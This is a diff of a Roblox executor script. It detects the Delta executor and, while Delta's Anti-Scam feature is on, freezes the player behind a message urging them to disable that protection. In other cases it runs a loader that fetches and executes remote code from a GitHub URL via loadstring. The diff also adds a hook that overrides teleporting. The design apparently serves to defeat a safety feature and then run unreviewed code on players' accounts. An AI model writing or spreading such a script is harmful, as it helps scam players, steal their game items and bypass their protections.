@@ -1,6 +1,7 @@
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local ContextActionService = game:GetService("ContextActionService")
+local TeleportService = game:GetService("TeleportService")
 
 -- Executor detection function
 local function detectExecutor()
@@ -21,8 +22,18 @@ local function detectExecutor()
     end
 end
 
--- Function to freeze player movement
+local executor = detectExecutor()
+
+-- Simulated Anti-Scam status (change for testing)
+local antiScamEnabled = true
+
+-- Debug prints
+print("Executor detected:", executor)
+print("Anti-Scam enabled:", antiScamEnabled)
+
+-- Freeze player movement function
 local function freezePlayer()
+    print("Freezing player movement")
     local character = player.Character or player.CharacterAdded:Wait()
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     if humanoid then
@@ -34,8 +45,9 @@ local function freezePlayer()
     ContextActionService:BindAction("FreezeKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
 end
 
--- Function to unfreeze player movement
+-- Unfreeze player movement function
 local function unfreezePlayer()
+    print("Unfreezing player movement")
     local character = player.Character
     if character then
         local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -49,20 +61,23 @@ local function unfreezePlayer()
     ContextActionService:UnbindAction("FreezeKeys")
 end
 
--- Simple warning GUI when Anti-Scam ON
+-- Warning GUI when Anti-Scam ON
 local function showWarning()
-    local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+    print("Showing Delta Anti-Scam warning GUI")
+    local gui = Instance.new("ScreenGui")
     gui.ResetOnSpawn = false
     gui.IgnoreGuiInset = true
+    gui.Parent = player:WaitForChild("PlayerGui")
 
-    local frame = Instance.new("Frame", gui)
+    local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0.5, 0, 0.3, 0)
     frame.Position = UDim2.new(0.25, 0, 0.35, 0)
     frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     frame.BorderSizePixel = 0
     frame.ClipsDescendants = true
+    frame.Parent = gui
 
-    local textLabel = Instance.new("TextLabel", frame)
+    local textLabel = Instance.new("TextLabel")
     textLabel.Size = UDim2.new(1, -20, 1, -20)
     textLabel.Position = UDim2.new(0, 10, 0, 10)
     textLabel.BackgroundTransparency = 1
@@ -71,28 +86,38 @@ local function showWarning()
     textLabel.TextSize = 20
     textLabel.TextWrapped = true
     textLabel.Text = "Warning: Delta Anti-Scam is enabled.\nPlease disable it in your executor settings for full functionality."
+    textLabel.Parent = frame
 
     freezePlayer()
 
-    -- Unfreeze after 30 seconds
+    -- Unfreeze and remove warning after 30 seconds
     task.delay(30, function()
         unfreezePlayer()
         gui:Destroy()
     end)
 end
 
--- Loader function (replace URL to your own loader)
+-- Loader function
 local function runLoader()
+    print("Running loader")
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/KONI/refs/heads/main/LUA"))()
     end)
 end
 
--- Simulated Anti-Scam status (change this for testing)
-local antiScamEnabled = true
+-- Override TeleportService.Teleport to block teleport when Anti-Scam OFF
+local originalTeleport = TeleportService.Teleport
+TeleportService.Teleport = function(self, placeId, ...)
+    if executor == "Delta" and antiScamEnabled then
+        print("Teleport allowed by Anti-Scam ON")
+        return originalTeleport(self, placeId, ...)
+    else
+        print("Teleport blocked (Anti-Scam OFF or non-Delta executor)")
+        return false
+    end
+end
 
-local executor = detectExecutor()
-
+-- Main logic
 if executor == "Delta" and antiScamEnabled then
     showWarning()
 else
